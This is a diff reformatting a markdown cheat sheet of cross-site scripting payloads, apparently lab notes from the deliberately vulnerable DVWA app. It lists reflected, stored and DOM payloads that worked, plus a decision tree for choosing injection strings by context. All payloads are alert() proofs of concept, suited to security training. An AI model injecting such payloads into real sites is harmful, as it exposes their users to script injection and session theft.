@@ -302,64 +302,65 @@ onload=alert('XSS') x=
 
 #### Inside URL
 
+```
 javascript:alert('XSS')
 data:text/html,<script>alert('XSS')</script>
-
----
+```
 
 ### 9. DVWA-SPECIFIC PAYLOADS (What Worked)
 
 #### Reflected XSS
 
-Raw: <script>alert('XSS')</script>
-URL-Encoded: %3Cscript%3Ealert('XSS')%3C/script%3E
-Used at: http://dvwa.local/vulnerabilities/xss_r/?name=PAYLOAD
-Result: ✓ Alert triggered
+- Raw: <script>alert('XSS')</script>
+- URL-Encoded: %3Cscript%3Ealert('XSS')%3C/script%3E
+- Used at: http://dvwa.local/vulnerabilities/xss_r/?name=PAYLOAD
+- Result: ✓ Alert triggered
 
 #### Stored XSS
 
-Raw: <img src=x onerror="alert('Stored XSS')">
-Submitted: Via form (Name + Message)
-Stored in: Database
-Result: ✓ Alert triggered every page load
+- Raw: <img src=x onerror="alert('Stored XSS')">
+- Submitted: Via form (Name + Message)
+- Stored in: Database
+- Result: ✓ Alert triggered every page load
 
 #### DOM XSS
 
-Raw: <img src=x onerror="alert('DOM XSS')">
-Injected: Directly in URL parameter
-Processing: JavaScript only (no server)
-Result: ✓ Alert triggered from client-side JS
+- Raw: <img src=x onerror="alert('DOM XSS')">
+- Injected: Directly in URL parameter
+- Processing: JavaScript only (no server)
+- Result: ✓ Alert triggered from client-side JS
 
 ---
 
 ## PAYLOAD SELECTION DECISION TREE
+================================
+
 
 Is input in HTML body?
-├─  YES
+├─ YES
 │  ├─ <script> tag filtered?
-│  │ ├─ YES → Try <img src=x onerror="alert()">
-│  │ └─ NO → Try <script>alert('XSS')</script>
+│  │  ├─ YES → Try <img src=x onerror="alert()">
+│  │  └─ NO → Try <script>alert('XSS')</script>
 │  └─ Quote marks in output?
-│  └─ Check for encoding (if " appears, check browser)
+│     └─ Check for encoding
 │
 ├─ Is input in HTML attribute?
-│ ├─ YES
-│ │ ├─ Uses double quotes?
-│ │ │ └─ Use: " onmouseover="alert('XSS')" x="
-│ │ └─ Uses single quotes?
-│ │ └─ Use: ' onclick='alert("XSS")' x='
-│ │
+│  ├─ YES
+│  │  ├─ Uses double quotes?
+│  │  │  └─ Use: " onmouseover="alert('XSS')" x="
+│  │  └─ Uses single quotes?
+│  │     └─ Use: ' onclick='alert("XSS")' x='
+│
 ├─ Is input in JavaScript?
-│ ├─ YES
-│ │ ├─ Inside string?
-│ │ │ ├─ Double quotes → Use: "; alert('XSS'); //
-│ │ │ └─ Single quotes → Use: '; alert('XSS'); //
-│ │ └─ Direct execution?
-│ │ └─ Use: alert('XSS')
-│ │
+│  ├─ YES
+│  │  ├─ Inside string?
+│  │  │  ├─ Double quotes → Use: "; alert('XSS'); //
+│  │  │  └─ Single quotes → Use: '; alert('XSS'); //
+│  │  └─ Direct execution?
+│  │     └─ Use: alert('XSS')
+│
 └─ Is input in URL?
-└─ Use: javascript:alert('XSS')
-
+   └─ Use: javascript:alert('XSS')
 
 ---
 
